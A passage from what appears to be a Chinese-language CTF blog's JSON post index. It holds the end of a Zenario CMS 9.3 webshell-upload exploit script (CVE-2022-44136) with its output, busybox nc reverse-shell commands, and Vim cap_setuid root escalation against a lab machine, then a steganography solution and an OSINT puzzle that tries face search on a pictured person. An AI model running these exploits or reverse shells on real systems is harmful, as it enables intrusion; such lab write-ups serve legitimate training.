e:\n                print(f'[-] \u547d\u4ee4\u6267\u884c\u5931\u8d25: {e}')\n            except IndexError:\n                 print(f'[-] \u65e0\u6cd5\u4ece\u54cd\u5e94\u4e2d\u63d0\u53d6\u547d\u4ee4\u8f93\u51fa\u3002')\n                 print(f'[-] \u539f\u59cb\u54cd\u5e94: {response.text}')\n\n\n    except KeyboardInterrupt:\n        print('\\n[*] \u68c0\u6d4b\u5230Ctrl+C\uff0c\u6b63\u5728\u9000\u51fa\u3002')\n    print('[*] Webshell\u4f1a\u8bdd\u5df2\u5173\u95ed\u3002')\n\n\nif __name__ == '__main__':\n    print_banner()\n    parser = argparse.ArgumentParser(description='Zenario CMS 9.3 RCE (CVE-2022-44136) Exploit')\n    parser.add_argument('target_url', help='\u76ee\u6807URL (\u4f8b\u5982: http://192.168.205.128:8000)')\n    parser.add_argument('--instance-id', default='20', help='\u6587\u4ef6\u4e0a\u4f20\u8868\u5355\u7684instanceId (\u9ed8\u8ba4\u4e3a20)')\n    parser.add_argument('--filename', default='shell.php', help='\u4e0a\u4f20\u7684webshell\u6587\u4ef6\u540d (\u9ed8\u8ba4\u4e3ashell.php)')\n    \n    if len(sys.argv) == 1:\n        parser.print_help()\n        sys.exit(1)\n        \n    args = parser.parse_args()\n    \n    shell_url = exploit(args.target_url, args.instance_id, args.filename)\n    \n    if shell_url:\n        interactive_shell(shell_url)\n    else:\n        print('\\n[-] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25\uff0c\u672a\u80fd\u83b7\u53d6Webshell\u3002')\n                                           \n```\n\n\u6267\u884c\u5229\u7528\u811a\u672c\uff1a\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ python3 exp.py http://192.168.205.128:8000                            \n============================================================\n Zenario CMS 9.3 Unauthenticated RCE Exploit (CVE-2022-44136)\n============================================================\n[*] \u51c6\u5907\u5411 http://192.168.205.128:8000/zenario/ajax.php \u4e0a\u4f20webshell...\n[*] \u4f7f\u7528 Instance ID: 20\n[*] \u4e0a\u4f20\u6587\u4ef6\u540d: shell.php\n[+] \u8bf7\u6c42\u5df2\u88ab\u4fee\u6539\uff0c\u6ce8\u5165 'Content-Tyope' \u7ed5\u8fc7\u4ee3\u7801\u3002\n[*] \u6b63\u5728\u53d1\u9001\u6076\u610f\u8bf7\u6c42...\n[+] \u670d\u52a1\u5668\u8fd4\u56de 200 OK\uff0c\u53ef\u80fd\u4e0a\u4f20\u6210\u529f\uff01\n\n============================================================\n[SUCCESS] Webshell\u4e0a\u4f20\u6210\u529f!\n[URL]: http://192.168.205.128:8000/private/uploads/JEk-Wwl_SpBQMaPvCw3mgBcAB1m7bw/shell.php\n============================================================\n\n[*] \u542f\u52a8\u4ea4\u4e92\u5f0fWebshell... (\u8f93\u5165 'exit' \u9000\u51fa)\ncmd > id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\n\u811a\u672c\u6210\u529f\u4e0a\u4f20\u4e86\u4e00\u4e2aPHP webshell\uff0c\u5e76\u83b7\u5f97\u4e86 `www-data` \u7528\u6237\u7684\u547d\u4ee4\u6267\u884c\u6743\u9650\u3002\n\n# \u4e09\u3001\u521d\u59cb\u8bbf\u95ee\u4e0e\u672c\u5730\u679a\u4e3e\n\n## 1. \u53cd\u5f39 Shell\n\n\u4e3a\u4e86\u83b7\u5f97\u66f4\u7a33\u5b9a\u7684\u4ea4\u4e92\u5f0f\u4f1a\u8bdd\uff0c\u5728\u653b\u51fb\u673a\u4e0a\u8bbe\u7f6e Netcat \u76d1\u542c\uff0c\u5e76\u4ece webshell \u4e2d\u6267\u884c\u53cd\u5f39 shell \u547d\u4ee4\u3002\n\n**\u653b\u51fb\u673a\u76d1\u542c:**\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~]\n\u2514\u2500$ nc -lvnp 8888\n```\n\n**Webshell \u4e2d\u6267\u884c:**\n\n```bash\ncmd > busybox nc 192.168.205.128 8888 -e /bin/bash\n```\n\n\u6210\u529f\u83b7\u5f97 `www-data` \u7528\u6237\u7684\u53cd\u5f39 shell\uff0c\u5e76\u5347\u7ea7\u4e3a\u6807\u51c6\u7684 TTY\u3002\n\n```\nscript /dev/null -c bash\nCtrl+Z\nstty raw -echo; fg\nreset xterm  \nexport TERM=xterm  \nexport SHELL=/bin/bash  \nstty rows 24 columns 80\n```\n\n## 2. \u672c\u5730\u4fe1\u606f\u6536\u96c6\n\n\u5728 `/home` \u76ee\u5f55\u4e0b\u53d1\u73b0\u7528\u6237 `morii`\uff0c\u5e76\u5728\u5176\u5bb6\u76ee\u5f55\u4e0b\u627e\u5230\u5e76\u8bfb\u53d6\u4e86 `user.txt` \u6587\u4ef6\u3002\n\n```\nwww-data@Rabb1t:/home/morii$ ls -al\n...\n-rw-r--r-- 1 morii morii   32 Jul 17 11:09 user.txt\nwww-data@Rabb1t:/home/morii$ cat user.txt \nflag{user_Down the Rabbit-Hole}\n```\n\n# \u56db\u3001\u6743\u9650\u63d0\u5347\n\n## 1. SUID/Capabilities \u6743\u9650\u68c0\u67e5\n\n\u5bf9\u7cfb\u7edf\u8fdb\u884c\u6743\u9650\u63d0\u5347\u5411\u91cf\u7684\u6392\u67e5\u3002`find` \u547d\u4ee4\u67e5\u627e SUID \u6587\u4ef6\uff0c\u4f46\u672a\u53d1\u73b0\u660e\u663e\u53ef\u5229\u7528\u7684\u5f02\u5e38\u6587\u4ef6\u3002\u63a5\u7740\u4f7f\u7528 `getcap` \u68c0\u67e5\u6587\u4ef6\u7684 Capabilities\u3002\n\n```\nwww-data@Rabb1t:/home/morii$ getcap -r / 2>/dev/null\n/usr/bin/vim = cap_setuid+ep\n...\n```\n\n\u53d1\u73b0 `/usr/bin/vim` \u88ab\u6388\u4e88\u4e86 `cap_setuid+ep` \u6743\u9650\u3002\u8fd9\u610f\u5473\u7740 Vim \u8fdb\u7a0b\u53ef\u4ee5\u8c03\u7528 `setuid()` \u7cfb\u7edf\u8c03\u7528\u6765\u6539\u53d8\u5176\u6709\u6548\u7528\u6237ID (EUID)\u3002\n\n## 2. \u5229\u7528 Vim Capabilities \u63d0\u6743\n\n\u68c0\u67e5 Vim \u7684\u7f16\u8bd1\u9009\u9879\uff0c\u786e\u8ba4\u5176\u662f\u5426\u652f\u6301\u53ef\u7528\u4e8e\u6267\u884c\u4ee3\u7801\u7684\u811a\u672c\u63a5\u53e3\u3002\n\n```\nwww-data@Rabb1t:/home/morii$ vim --version\n...\n-python            -python3           +ruby              \n...\n```\n\n\u7ed3\u679c\u663e\u793a\uff0c\u867d\u7136 Python \u63a5\u53e3\u88ab\u7981\u7528\u4e86\uff0c\u4f46 **Ruby (`+ruby`)** \u63a5\u53e3\u662f\u542f\u7528\u7684\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528 Vim \u7684 Ruby \u63a5\u53e3\uff0c\u7ed3\u5408 `cap_setuid` \u6743\u9650\u6765\u6267\u884c\u4ee3\u7801\u5e76\u63d0\u6743\u81f3 root\u3002\n\n**\u63d0\u6743\u6b65\u9aa4\uff1a**\n\n1. \u5728\u653b\u51fb\u673a\u4e0a\u5f00\u542f Netcat \u76d1\u542c\u4ee5\u63a5\u6536 root shell\u3002\n\n   ```bash\n   nc -lvnp 8888\n   ```\n\n2. \u5728\u9776\u673a\u4e0a\u6267\u884c\u4e00\u6761\u7cbe\u5fc3\u6784\u9020\u7684 Vim \u547d\u4ee4\u3002\u8be5\u547d\u4ee4\u5229\u7528 Ruby \u63a5\u53e3\u9996\u5148\u5c06\u8fdb\u7a0b\u7684 EUID \u8bbe\u7f6e\u4e3a 0 (root)\uff0c\u7136\u540e\u6267\u884c\u4e00\u4e2a\u53cd\u5f39 shell \u547d\u4ee4\u3002\n\n   ```bash\n   vim -c ':ruby Process::Sys.setuid(0); exec('busybox nc 192.168.205.128 8888 -e /bin/bash')'\n   ```\n\n\u653b\u51fb\u673a\u6210\u529f\u63a5\u6536\u5230\u8fde\u63a5\uff0c\u83b7\u5f97\u4e86\u4e00\u4e2a `euid=0` \u7684 root \u6743\u9650 shell\u3002\n\n# 3. \u83b7\u53d6\u6700\u7ec8\u51ed\u8bc1\n\n\u5728 root shell \u4e2d\uff0c\u8bfb\u53d6 `/root` \u76ee\u5f55\u4e0b\u7684\u6700\u7ec8 flag \u6587\u4ef6\u3002\n\n```bash\nroot@Rabb1t:/home/morii# id\nuid=0(root) gid=33(www-data) groups=33(www-data)\nroot@Rabb1t:/home/morii# cat /root/root.txt /home/morii/user.txt \nflag{root_Alice\u2019s Evidence}\nflag{user_Down the Rabbit-Hole}\n```\n\n\u81f3\u6b64\uff0c\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\uff0c\u6210\u529f\u83b7\u53d6\u4e86\u7cfb\u7edf\u7684 root \u6743\u9650\u3002sentence", "top": 0, "createdAt": 1752993220, "style": "<style>.markdown-alert{padding:0.5rem 1rem;margin-bottom:1rem;border-left:.25em solid var(--borderColor-default,var(--color-border-default));}.markdown-alert .markdown-alert-title {display:flex;font-weight:var(--base-text-weight-medium,500);align-items:center;line-height:1;}.markdown-alert>:first-child {margin-top:0;}.markdown-alert>:last-child {margin-bottom:0;}</style><style>.markdown-alert.markdown-alert-tip {border-left-color:var(--borderColor-success-emphasis, var(--color-success-emphasis));background-color:var(--color-success-subtle);}.markdown-alert.markdown-alert-tip .markdown-alert-title {color: var(--fgColor-success,var(--color-success-fg));}</style>", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-20", "dateLabelColor": "#0969da"}, "P150": {"htmlDir": "docs/post/Challenge 064.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 064", "postUrl": "post/Challenge%20064.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/150", "commentNum": 0, "wordCount": 2275, "description": "\u5bb3\uff0c\u661f\u671f\u65e5\u8fd8\u8981\u770b\u5907\u8003\u89c6\u9891\uff0c\u653e\u677e\u4e00\u4e0b\n\n![image-20250720151939191](https://7r1UMPHK.github.io/image/20250720151939414.webp)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 064.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 337165 bytes (330 KiB)\n\nExtracting archive: 064.zip\n--\nPath = 064.zip\nType = zip\nPhysical Size = 337165\n\nEverything is Ok\n\nFiles: 2\nSize:       337065\nCompressed: 337165\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -al        \n\u603b\u8ba1 675\ndrwxr-xr-x 1 kali kali   4096  7\u670820\u65e5 03:20 .\ndrwxr-xr-x 1 kali kali  12288  7\u670820\u65e5 03:14 ..\n-rwxr-xr-x 1 kali kali 337165  7\u670820\u65e5 03:19 064.zip\n-rwxr-xr-x 1 kali kali 336604 2024\u5e74 1\u670817\u65e5 challenge.png\n-rwxr-xr-x 1 kali kali    461 2024\u5e74 1\u670818\u65e5 decodesteg.py\n                                  \n```\n\n![challenge](https://7r1UMPHK.github.io/image/20250720152043954.webp)\n\nisEven(R+G+B)\u63d0\u793aflag \u85cf\u5728\u201cRGB \u4e09\u901a\u9053\u4e4b\u548c\u4e3a\u5076\u6570\u201d\u7684\u50cf\u7d20\u91cc\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cat decodesteg.py \nfrom PIL import Image\n\nim = Image.open('challenge.png')\npixelMap = im.load()\nimg = Image.new( im.mode, im.size)\npixelsNew = img.load()\n\nfor i in range(img.size[0]):\n    for j in range(img.size[1]):\n        RGB = im.getpixel((i,j))\n        R,G,B = RGB\n        #\n\n        #\n        pixelsNew[i,j] = (R,G,B)\nim.close()\n\nimg.show()\nimg.save('flag.png') \nimg.close()\n\n# Can you find the flag hidden in the image?\n# may need to 'pip3 install pillow' if not installed\n                                                  \n```\n\n\u586b\u4ee3\u7801\n\n```\nfrom PIL import Image\n\nim = Image.open('challenge.png')\npixelMap = im.load()\nimg = Image.new(im.mode, im.size)\npixelsNew = img.load()\n\nfor i in range(img.size[0]):\n    for j in range(img.size[1]):\n        R, G, B = im.getpixel((i, j))\n        if (R + G + B) % 2 == 0:\n            pixelsNew[i, j] = (255, 255, 255)  \n        else:\n            pixelsNew[i, j] = (0, 0, 0)        \n\nim.close()\nimg.show()\nimg.save('flag.png')\nimg.close()\n```\n\n![flag](https://7r1UMPHK.github.io/image/20250720152504984.webp)\n\n```\nHMV{Play_with_Pixels}\n```\n\nsentence", "top": 0, "createdAt": 1753071112, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-21", "dateLabelColor": "#0969da"}, "P151": {"htmlDir": "docs/post/Challenge 065.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 065", "postUrl": "post/Challenge%20065.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/151", "commentNum": 0, "wordCount": 8251, "description": "# 065\n\n## material \u6750\u6599\n\n### badge.png \u5fbd\u7ae0\n\n![image-20250720175756421](https://7r1umphk.github.io/image/20250721120816690.webp)\n\nX\u7279\u5de5\n\n\u7f51\u7edc\u90e8\u95e8\n\n\u6682\u65f6google\u6ca1\u6709\u627e\u5230\u51fa\u5904\n\nyandex\u627e\u5230\u76f8\u4f3c\u7684youtube\u7528\u6237\nhttps://www.youtube.com/@botaniker6644/videos \u4e3b\u9898csgo \u65e0\u7528\n\n### files.zip \u6587\u4ef6\n\n\u89e3\u538b\u51fafiles\u6587\u4ef6\u5939\n\n### letter.txt \u4fe1\n\n```\nGood morning AgentX,\n\nBefore continuing with the new mission, you need to read the welcome message from our best agent WhiteRabbit.\n\n> Distinguished AgentX,\n> \n> \n> It is with great pleasure that I extend to you a warm welcome to our esteemed hacking group. Your inclusion enhances our collective capabilities, and we anticipate your contributions with enthusiasm. As we navigate the intricacies of cyberspace, I am confident that your skills will prove invaluable to our endeavors.\n> \n> May our collaboration be marked by professionalism, mutual respect, and shared success. We look forward to your insights and expertise as we embark on various undertakings together.\n> \n> Once again, welcome to the team.\n> \n> Sincerely,\n> WhiteRabbit\n> \n\n# MISSION\n\nNow let\u2019s talk, about your mission:\nYou will need to search all possible information about the target and store them for the future. You will later receive from another team member a encrypted message that was left by him before vanishing. We absolutely need your capabilities to be able to understand what he is trying to do.\nYou will need a special key obtained in (https://hackmyvm.eu/challenges/challenge.php?c=052) to be able to see the to start with the mission.\n\nBest of luck for you AgentX,\n\nSh4dowExe\n```\n\n\u6252\u62c9\u5230\u4e86\u4f5c\u8005X\n\nhttps://x.com/Sh4dow3x3\n\n#### \u7ffb\u8bd1\n\n```\nAgentX\uff0c\u65e9\u4e0a\u597d\uff01\n\n\u5728\u7ee7\u7eed\u6267\u884c\u65b0\u4efb\u52a1\u4e4b\u524d\uff0c\u8bf7\u9605\u8bfb\u6211\u4eec\u6700\u68d2\u7684\u7279\u5de5\u201c\u767d\u5154\u201d\uff08WhiteRabbit\uff09\u7684\u6b22\u8fce\u8bcd\u3002\n\n> \u5c0a\u656c\u7684 AgentX\uff0c\n>\n>\n> \u6211\u975e\u5e38\u9ad8\u5174\u5730\u5411\u60a8\u81f4\u4ee5\u70ed\u70c8\u7684\u6b22\u8fce\uff0c\u6b22\u8fce\u60a8\u52a0\u5165\u6211\u4eec\u5c0a\u8d35\u7684\u9ed1\u5ba2\u56e2\u961f\u3002\u60a8\u7684\u52a0\u5165\u589e\u5f3a\u4e86\u6211\u4eec\u7684\u96c6\u4f53\u5b9e\u529b\uff0c\u6211\u4eec\u70ed\u5207\u671f\u5f85\u60a8\u7684\u8d21\u732e\u3002\u5728\u6211\u4eec\u63a2\u7d22\u9519\u7efc\u590d\u6742\u7684\u7f51\u7edc\u7a7a\u95f4\u4e4b\u9645\uff0c\u6211\u76f8\u4fe1\u60a8\u7684\u6280\u80fd\u5c06\u5bf9\u6211\u4eec\u7684\u4e8b\u4e1a\u53d1\u6325\u4e0d\u53ef\u4f30\u91cf\u7684\u4f5c\u7528\u3002\n>\n> \u613f\u6211\u4eec\u7684\u5408\u4f5c\u4ee5\u4e13\u4e1a\u7cbe\u795e\u3001\u76f8\u4e92\u5c0a\u91cd\u548c\u5171\u540c\u6210\u529f\u4e3a\u6807\u5fd7\u3002\u6211\u4eec\u671f\u5f85\u60a8\u5728\u5171\u540c\u5f00\u5c55\u5404\u9879\u5de5\u4f5c\u65f6\u63d0\u4f9b\u5b9d\u8d35\u7684\u89c1\u89e3\u548c\u4e13\u4e1a\u77e5\u8bc6\u3002\n>\n> \u518d\u6b21\u6b22\u8fce\u60a8\u52a0\u5165\u6211\u4eec\u7684\u56e2\u961f\u3002\n>\n> \u6b64\u81f4\uff0c\n> \u767d\u5154\n>\n\n# \u4efb\u52a1\n\n\u73b0\u5728\uff0c\u8ba9\u6211\u4eec\u6765\u8c08\u8c08\u60a8\u7684\u4efb\u52a1\uff1a\n\u60a8\u9700\u8981\u641c\u7d22\u6240\u6709\u5173\u4e8e\u76ee\u6807\u7684\u53ef\u80fd\u4fe1\u606f\uff0c\u5e76\u5c06\u5176\u4fdd\u5b58\u4ee5\u5907\u5c06\u6765\u4f7f\u7528\u3002\u4f60\u7a0d\u540e\u4f1a\u6536\u5230\u53e6\u4e00\u4f4d\u56e2\u961f\u6210\u5458\u5728\u6d88\u5931\u524d\u7559\u4e0b\u7684\u52a0\u5bc6\u4fe1\u606f\u3002\u6211\u4eec\u7edd\u5bf9\u9700\u8981\u4f60\u7684\u80fd\u529b\u6765\u7406\u89e3\u4ed6\u60f3\u8981\u505a\u4ec0\u4e48\u3002\n\u4f60\u9700\u8981\u4e00\u4e2a\u5728 (https://hackmyvm.eu/challenges/challenge.php?c=052) \u83b7\u53d6\u7684\u7279\u6b8a\u5bc6\u94a5\u624d\u80fd\u67e5\u770b\u4efb\u52a1\u7684\u5f00\u59cb\u90e8\u5206\u3002\n\n\u795d AgentX \u597d\u8fd0\uff01\n\nSh4dowExe\n```\n\n## files\n\n### file.txt\n\n```\n     _                      _______                      _\t\t\t\t\t\n  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_\t\t\n dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb\t\t\n V      ~'Mb          dOOOOOOOOOOOOOOOOOb          dM'~      V\t\t\n          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'\n           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'\n      __     `YMMM| OP'~'YOOOOOOOOOOOP'~`YO |MMMP'     __\n    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.\n _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._\n\n             `YMMMM\\`OOOo     OOO     oOOO'/MMMMP'\n     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.\n   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.\n  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.\n  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM\n  YMb           ~YMMMM\\`OOOOI`````IOOOOO'/MMMMP~           dMP\n   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'\t\t\t\t\t\t\n     `'                  `OObNNNNNdOO'                   `'\n                           `~OOOOO~'   \n\n496665656C796F757267617A65696E7468657065726970686572792C61737562746C6565\n63686F6F66666F6F747374657073696E73796E63776974686D696E652E54686564616E63\n65696E736861646F77736861736E6F74676F6E65756E6E6F74696365642E496E74686973\n696E747269636174657765626F6670617468732C4973656E7365796F757273696C656E74\n707572737569742E4F75726A6F75726E657974616B657375737468726F75676874776973\n7473616E647475726E732C796574796F757270726573656E6365697361636F6E7374616E\n742C6C696B656167686F7374696E74686572656172766965776D6972726F722E4E6F6E65\n6564666F72636F6465646D657373616765736F72636C616E64657374696E657369676E61\n6C7374686561776172656E65737368616E6773696E7468656169722C6173686172656473\n65637265746265747765656E7072656461746F72616E64707265792E4C6574697462656B\n6E6F776E7468617474686568756E7465646973636F676E697A616E742C77656176696E67\n7468726F7567687468656C61627972696E746877697468707572706F73652E5468656368\n6173652C74686F75676873696C656E742C69736174657374616D656E74746F746865696E\n7472696361636965736F666F75726661746573696E7465727477696E696E672E41737468\n656E6172726174697665756E666F6C64732C72656D656D626572746869733A6576657279\n737465706563686F6573696E746865636F727269646F72736F66616E7469636970617469\n6F6E2E556E74696C6F75727061746873636F6E76657267656F72646976657267652C6C65\n7474686564616E6365636F6E74696E75652E\n     _                      _______                      _\t\t\t\t\t\n  _dMMMb._              .adOOOOOOOOOba.              _,dMMMb_\t\t\n dP'  ~YMMb            dOOOOOOOOOOOOOOOb            aMMP~  `Yb\t\t\n V      ~'Mb          dOOOOOOOOOOOOOOOOOb          dM'~      V\t\t\n          `Mb.       dOOOOOOOOOOOOOOOOOOOb       ,dM'\n           `YMb._   |OOOOOOOOOOOOOOOOOOOOO|   _,dMP'\n      __     `YMMM| OP'~'YOOOOOOOOOOOP'~`YO |MMMP'     __\n    ,dMMMb.     ~~' OO     `YOOOOOP'     OO `~~     ,dMMMb.\n _,dP~  `YMba_      OOb      `OOO'      dOO      _aMMP'  ~Yb._\n\n             `YMMMM\\`OOOo     OOO     oOOO'/MMMMP'\n     ,aa.     `~YMMb `OOOb._,dOOOb._,dOOO'dMMP~'       ,aa.\n   ,dMYYMba._         `OOOOOOOOOOOOOOOOO'          _,adMYYMb.\n  ,MP'   `YMMba._      OOOOOOOOOOOOOOOOO       _,adMMP'   `YM.\n  MP'        ~YMMMba._ YOOOOPVVVVVYOOOOP  _,adMMMMP~       `YM\n  YMb           ~YMMMM\\`OOOOI`````IOOOOO'/MMMMP~           dMP\n   `Mb.           `YMMMb`OOOI,,,,,IOOOO'dMMMP'           ,dM'\t\t\t\t\t\t\n     `'                  `OObNNNNNdOO'                   `'\n                           `~OOOOO~' \n```\n\n#### hex\u89e3\u7801\n\n```\nIfeelyourgazeintheperiphery,asubtleechooffootstepsinsyncwithmine.Thedanceinshadowshasnotgoneunnoticed.Inthisintricatewebofpaths,Isenseyoursilentpursuit.Ourjourneytakesusthroughtwistsandturns,yetyourpresenceisaconstant,likeaghostintherearviewmirror.Noneedforcodedmessagesorclandestinesignalstheawarenesshangsintheair,asharedsecretbetweenpredatorandprey.Letitbeknownthatthehuntediscognizant,weavingthroughthelabyrinthwithpurpose.Thechase,thoughsilent,isatestamenttotheintricaciesofourfatesintertwining.Asthenarrativeunfolds,rememberthis:everystepechoesinthecorridorsofanticipation.Untilourpathsconvergeordiverge,letthedancecontinue.\n```\n\n##### \u6062\u590d\n\n```\nI feel your gaze in the periphery, a subtle echo of footsteps in sync with mine.\nThe dance in shadows has not gone unnoticed.\nIn this intricate web of paths, I sense your silent pursuit.\nOur journey takes us through twists and turns, yet your presence is a constant, like a ghost in the rear-view mirror.\nNo need for coded messages or clandestine signals\u2014the awareness hangs in the air, a shared secret between predator and prey.\nLet it be known that the hunted is cognizant, weaving through the labyrinth with purpose.\nThe chase, though silent, is a testament to the intricacies of our fates intertwining.\nAs the narrative unfolds, remember this: every step echoes in the corridors of anticipation.\nUntil our paths converge or diverge, let the dance continue.\n```\n\n\u6ca1\u627e\u5230\u51fa\u5904\n\n##### \u7ffb\u8bd1\n\n```\n\u6211\u611f\u53d7\u5230\u4f60\u4f59\u5149\u91cc\u7684\u51dd\u89c6\uff0c\u90a3\u662f\u4e0e\u6211\u540c\u6b65\u7684\u811a\u6b65\u5728\u6697\u5904\u8f7b\u67d4\u56de\u54cd\u3002\n\u9634\u5f71\u4e2d\u7684\u821e\u6b65\u5e76\u672a\u9003\u8fc7\u6211\u7684\u773c\u775b\u3002\n\u5728\u8fd9\u7eb5\u6a2a\u4ea4\u9519\u7684\u8def\u7f51\u91cc\uff0c\u6211\u5bdf\u89c9\u5230\u4f60\u65e0\u58f0\u7684\u8ffd\u9010\u3002\n\u6211\u4eec\u4e00\u8def\u873f\u8712\u524d\u884c\uff0c\u800c\u4f60\u7684\u5b58\u5728\u5374\u59cb\u7ec8\u5982\u5f71\u968f\u5f62\uff0c\u50cf\u540e\u89c6\u955c\u91cc\u6325\u4e4b\u4e0d\u53bb\u7684\u5e7d\u5f71\u3002\n\u65e0\u9700\u6697\u53f7\uff0c\u4e5f\u65e0\u9700\u5bc6\u8bed\u2014\u2014\u8fd9\u4efd\u5fc3\u77e5\u809a\u660e\u7684\u9ed8\u5951\u60ac\u6d6e\u5728\u7a7a\u6c14\u91cc\uff0c\u662f\u730e\u8005\u4e0e\u730e\u7269\u95f4\u5fc3\u7167\u4e0d\u5ba3\u7684\u79d8\u5bc6\u3002\n\u8bf7\u77e5\u6653\uff1a\u88ab\u730e\u8005\u5e76\u975e\u65e0\u77e5\uff0c\u4ed6\u6b63\u5e26\u7740\u76ee\u7684\u7a7f\u68ad\u4e8e\u8ff7\u5bab\u3002\n\u8fd9\u573a\u65e0\u58f0\u7684\u8ffd\u9010\uff0c\u6b63\u662f\u6211\u4eec\u547d\u8fd0\u4ea4\u7ec7\u7684\u660e\u8bc1\u3002\n\u5f53\u6545\u4e8b\u7ee7\u7eed\u94fa\u5c55\uff0c\u8bf7\u8bb0\u4f4f\uff1a\u6bcf\u4e00\u6b65\u90fd\u5728\u671f\u5f85\u7684\u56de\u5eca\u91cc\u6fc0\u8d77\u56de\u58f0\u3002\n\u76f4\u5230\u6211\u4eec\u4ea4\u6c47\u6216\u5206\u79bb\uff0c\u8ba9\u8fd9\u652f\u821e\u7ee7\u7eed\u3002\n```\n\n#### \u89e3\u538b\u7f29HTTP\n\n```\ntthedancecontinue.\n```\n\n##### \u7ffb\u8bd1\n\n\u821e\u8e48\u7ee7\u7eed\u3002\n\n### target.png\n\n![image-20250720180143396](https://7r1umphk.github.io/image/20250721120821603.webp)\n\n\u6252\u62c9\u5230\u4e86\u4e00\u4e2a\u5de8\u50cf\u7684\nhttps://www.idcreator.com/id-card-templates/plastic-business-cards/employee-id-card-2.html\n\n![image-20250720181852097](https://7r1umphk.github.io/image/20250721120825661.webp)\n\n- **Date of Birth**: 1960/1/5\n- **Blood Group**: O+\n- **Mobile**: +78935859580\n\n\u6240\u4ee5\u63a8\u6d4b\u662f\u627e\u4eba\u8138\n\n\u56fe\u7247\u6252\u62c9\u4e86\u4e00\u4e2a\u5f88\u50cf\uff0c\u4f46\u662f\u90a3\u4e2a\u5e73\u53f0\u8981\u94b1\nhttps://pimeyes.com/en/results/qY6_250720pde3o1c9nhaqgk8e0dcd836?query=c1809c90dcfdfdef809cbe8afeeededf\n\n![image-20250720230532694](https://7r1umphk.github.io/image/20250721120829295.webp)\n\n```\n2023:11:24 17:16:07-05:00\n```\n\n\u4e0d\u505a\u4e86\uff0c\u5c01\u6863\n\n\u76ee\u524d\u6765\u770b\u5c31\u662f\u901a\u8fc7\u4eba\u7269\u56fe\u7247\u8fdb\u884c\u53cd\u5411\n\n\u4ee5\u4e0b\u662fai\u6269\u56fe\u548c\u56fe\u7247\u653e\u5927\u7684\u6210\u679c\n![IMG_20250721_0115591](https://7r1umphk.github.io/image/20250721120912315.webp)\n\n![image-20250721120933973](https://7r1umphk.github.io/image/20250721120934213.webp)\n\n![image-20250721120944955](https://7r1umphk.github.io/image/20250721120945338.webp)\n\n\u76ee\u524d\u89c9\u5f97\u6700\u6709\u53ef\u80fd\u7684\u662f\u804c\u4e1a\u4e3a\u533b\u751f\uff0c\u62a4\u58eb\uff0c\u62a4\u7406\u65b9\u5411\n\n\u53ef\u80fd\u662f\u4f7f\u7528\u8138\u4e66\u8fdb\u884c\u5927\u91cf\u641c\u7d22sentence", "top": 0, "createdAt": 1753071129, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-21", "dateLabelColor": "#0969da"}, "P152": {"htmlDir": "docs/post/nei-bu-_Change.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Change", "postUrl": "post/nei-bu-_Change.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/152", "commentNum": 0, "wordCount": 4975, "description": "\n\n![image](https://7r1UMPHK.github.io/image/20250721221556384.webp)\n\n# \u4e00\u3001\u4fe1\u606f\u6536\u96c6\n\n# 1. \u4e3b\u673a\u53d1\u73b0\n\n\u9996\u5148\uff0c\u5728\u5185\u7f51\u73af\u5883\u4e2d\u4f7f\u7528 `arp-scan` 